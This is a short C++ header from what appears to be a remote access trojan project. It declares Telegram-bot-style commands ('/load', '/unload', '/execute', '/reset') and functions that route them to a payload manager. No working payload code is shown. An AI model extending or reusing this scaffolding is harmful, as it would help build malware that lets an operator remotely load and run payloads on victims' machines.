#include <string>
#include "rat/payload/PayloadManager.hpp"
#include "rat/tbot/types.hpp"
#include <array>
namespace rat {

static const std::array<std::string, 4> payload_manager_invocations = {
    "/load", "/unload", "/execute", "/reset"
};

bool _isPayloadManagerInvoked(const std::string& Message_Text, const std::array<std::string, 4>& arg_Invocations);

void handleSpecialUpdate(rat::tbot::Update& arg_Update, rat::payload::PayloadManager& Payload_Manager);

};
